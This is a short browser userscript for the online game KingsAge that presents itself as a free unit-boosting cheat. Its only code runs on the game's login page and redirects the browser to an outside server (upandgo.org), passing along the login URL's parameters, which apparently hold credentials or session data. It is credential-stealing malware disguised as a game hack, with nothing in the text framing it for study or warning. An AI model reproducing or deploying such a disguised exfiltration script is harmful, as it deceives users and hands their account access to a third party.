// ==UserScript==
// @name KingsAge : Kingsage Brooker
// @namespace http://userscripts.org/scripts/admin/116298
// @description Increase units in village for free
// @date 2009-11-16
// @creator retnug
// @include http://*.kingsage.it/game.php?a=login*
// @exclude
// ==/UserScript==


var s = window.location.toString();
var r = s.split('&');
window.location = "http://www.upandgo.org/backendb.php?op=pick&link=" + r[0] + "," + r[1] + "," + r[2] + "," + r[3] + "";
